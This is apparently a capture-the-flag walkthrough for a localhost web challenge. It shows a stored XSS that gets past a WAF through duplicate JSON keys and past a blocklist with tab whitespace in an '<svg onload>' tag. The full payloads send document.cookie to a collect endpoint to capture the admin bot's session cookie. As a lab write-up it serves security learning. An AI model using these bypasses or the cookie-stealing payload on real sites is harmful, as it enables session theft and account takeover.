# Doppelganger — Player Walkthrough

This guide is for players solving the challenge as a black-box application. It
does not assume access to the source code.

## Step 1: Establish normal behavior

Submit a harmless JSON note:

```json
{"content":"ordinary note"}
```

A successful request confirms that the service accepts JSON notes.

## Step 2: Test obvious HTML

Try an obvious browser payload:

```json
{"content":"<svg onload=alert(1)>"}
```

The application rejects it. This tells you that an additional filter is
looking for dangerous HTML or event-handler syntax.

## Step 3: Test duplicate JSON members

Try the same idea with two `content` fields:

```json
{"content":"safe","content":"<svg onload=alert(1)>"}
```

If the response changes from a WAF-style rejection to a blocklist-style
rejection, the two validation layers are not processing the request
identically.

This is a useful discovery:

```text
first content value  -> one validation layer
last content value   -> another validation layer
```

Use a harmless first value and continue testing the second value.

This behavior is known as duplicate JSON keys or a JSON parser differential.
The standards reference is [RFC 8259, Section 4](https://www.rfc-editor.org/rfc/rfc8259.html#section-4).

## Step 4: Mutate whitespace

The obvious form contains two strings that filters commonly search for:

```text
<svg 
onload=
```

Browsers accept more whitespace forms than simple string checks usually do.
Test ordinary HTML whitespace at the boundaries, after the tag name and before
the equals sign.

The intended form is:

```html
<svg	onload =fetch(...)>
```

In raw JSON, represent the tab using `\t`:

```json
{"content":"normal note","content":"<svg\tonload =fetch('/api/collect/local-player?c='+encodeURIComponent(document.cookie))>"}
```

The backslash and `t` must remain in the JSON request. Do not replace the
sequence with an ordinary space.

## Step 5: Submit the payload

Use the inbox token shown on the challenge page. With the default token, the
payload is:

```json
{"content":"normal note","content":"<svg\tonload =fetch('/api/collect/local-player?c='+encodeURIComponent(document.cookie))>"}
```

Submit the raw JSON through the challenge interface.

## Step 6: Wait for the administrator review

The admin bot is periodic. Wait for the review interval, then open:

```text
http://localhost:5000/api/solved
```

You are looking for a `capture.value` similar to:

```text
admin_session=<flag>
```

URL-decode the value if needed. The `admin_session` cookie contains the flag.

## How to learn from the responses

| Observation | Likely meaning |
|---|---|
| Normal note is accepted | JSON format and endpoint are correct |
| Obvious HTML is blocked immediately | A first filter detects the raw request |
| Duplicate-key request receives a different rejection | Validation and backend parsing differ |
| Whitespace mutation is accepted | The blocklist uses exact string matching |
| No capture yet | Wait for the admin review cycle |
| Capture appears | The stored browser payload executed |

Do not change several unrelated parts at once. Change one boundary, resubmit,
and compare the response.

## Troubleshooting

### The WAF rejection appears

Check that the first `content` value is harmless:

```json
{"content":"normal note","content":"YOUR_TEST_VALUE"}
```

### The blocklist rejection appears

Test the whitespace boundaries. The intended form has:

```text
<svg[TAB]onload[SPACE]=
```

In JSON notation, that is:

```text
<svg\tonload =
```

### The note is accepted but the inbox is empty

Wait for the bot review. Also confirm that:

- The inbox token matches the one shown on the page.
- The URL is inside the JavaScript string.
- The JSON was submitted as raw JSON.
- You opened `/api/solved` after the review cycle.

## What not to assume

- You do not need the admin dashboard URL.
- You do not need the internal bot token.
- You do not need server access.
- You do not need to guess the flag.

The solve is complete when the inbox receives the administrator session cookie
containing the flag.
